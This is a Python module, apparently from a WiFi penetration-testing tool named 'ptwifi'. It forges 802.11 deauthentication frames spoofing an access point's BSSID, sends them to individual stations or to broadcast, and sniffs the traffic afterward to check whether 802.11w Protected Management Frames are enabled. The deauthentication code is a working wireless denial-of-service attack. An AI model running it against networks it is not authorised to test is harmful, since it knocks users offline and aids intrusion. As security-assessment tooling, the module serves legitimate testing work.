"""
modules/deauth_attack.py
Author: Martin Živný

Description
-----------
This module implements a WiFi deauthentication test in the ptwifi tool.

It constructs IEEE 802.11 deauthentication frames and transmits them toward
a specified Access Point and/or client station. 
It performs an automated PMF (802.11w) test by analyzing post-attack traffic
for reconnection attempts (Auth/Assoc frames) vs uninterrupted data flow.
Results are written directly to the provided AP object.
"""

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp, sniff
from helpers.classes import AP

def run(interface: str, target_ap: AP, time_period: float = None, number: int = None, burst_number: int = None):
    """
    Main execution function.
    Performs automated 802.11w test based on AP's associated STAs.
    Analyzes post-attack frames for Auth/Assoc requests.
    """
    if not hasattr(target_ap, 'test_results'):
        target_ap.test_results = {}

    inter_sec = (time_period / 1000.0) if time_period is not None else 0.05
    packet_count = 25 if (number is None or number == -1) else number

    associated_stas = getattr(target_ap, 'associated_STAs', [])

    # 1. Targeted Unicast Attack
    if associated_stas:
        for sta_mac in associated_stas:
            print(f"\n[*] 802.11w Test: Sending {packet_count} unicast deauth frames to {sta_mac}...")
            
            dot11 = Dot11(addr1=sta_mac, addr2=target_ap.bssid, addr3=target_ap.bssid, type=0, subtype=12)
            packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
            
            sendp(packet, iface=interface, count=packet_count, inter=inter_sec, verbose=False)

            print(f"[*] Attack finished. Monitoring for reconnection attempts (4s)...")
            
            # Capture all frames originating from the station
            frames = sniff(
                iface=interface, 
                timeout=4, 
                lfilter=lambda x: x.haslayer(Dot11) and x.addr2 and x.addr2.upper() == sta_mac.upper()
            )

            result_key = f"802.11w_{sta_mac}"
            
            # Filter for Authentication (11), Association Req (0), Reassociation Req (2)
            reconnect_frames = [f for f in frames if f.type == 0 and f.subtype in (0, 2, 11)]
            data_frames = [f for f in frames if f.type == 2]

            if len(reconnect_frames) > 0:
                print(f"[-] PMF Inactive: Station {sta_mac} disconnected and is attempting to reconnect.")
                target_ap.test_results[result_key] = "Disconnected (Reconnecting)"
            elif len(data_frames) > 0:
                print(f"[+] PMF Active: Station {sta_mac} ignored deauth and continues data transmission.")
                target_ap.test_results[result_key] = "Active/Ignored"
            else:
                print(f"[-] PMF Inactive: Station {sta_mac} disconnected and went silent.")
                target_ap.test_results[result_key] = "Disconnected (Silent)"

    # 2. Broadcast Attack
    else:
        print(f"\n[*] 802.11w Test: No associated STAs found. Sending {packet_count} broadcast deauth frames...")
        
        dot11 = Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target_ap.bssid, addr3=target_ap.bssid, type=0, subtype=12)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        
        sendp(packet, iface=interface, count=packet_count, inter=inter_sec, verbose=False)
        
        print(f"[*] Attack finished. Monitoring for BSS traffic (4s)...")
        
        # Capture all frames within the BSS
        frames = sniff(
            iface=interface, 
            timeout=4, 
            lfilter=lambda x: x.haslayer(Dot11) and (
                (x.addr1 and x.addr1.upper() == target_ap.bssid.upper()) or 
                (x.addr2 and x.addr2.upper() == target_ap.bssid.upper()) or 
                (x.addr3 and x.addr3.upper() == target_ap.bssid.upper())
            )
        )

        result_key = "802.11w_Broadcast"
        
        # Identify MACs trying to reconnect vs MACs transmitting data without reconnecting
        reconnecting_macs = set(f.addr2 for f in frames if f.type == 0 and f.subtype in (0, 2, 11) and f.addr2)
        surviving_macs = set(f.addr2 for f in frames if f.type == 2 and f.addr2 and f.addr2 not in reconnecting_macs)
        
        # Remove AP BSSID from sender sets
        reconnecting_macs.discard(target_ap.bssid)
        surviving_macs.discard(target_ap.bssid)

        if surviving_macs:
            print(f"[+] Hidden clients detected! PMF Active for MACs: {', '.join(surviving_macs)}")
            target_ap.test_results[result_key] = f"Active/Ignored (Hidden clients: {', '.join(surviving_macs)})"
        elif reconnecting_macs:
            print(f"[-] PMF Inactive: Hidden clients {', '.join(reconnecting_macs)} attempting to reconnect.")
            target_ap.test_results[result_key] = f"Disconnected/Reconnecting (Hidden clients: {', '.join(reconnecting_macs)})"
        else:
            print("[-] No clients detected (or all successfully disconnected and silent).")
            target_ap.test_results[result_key] = "No connected clients"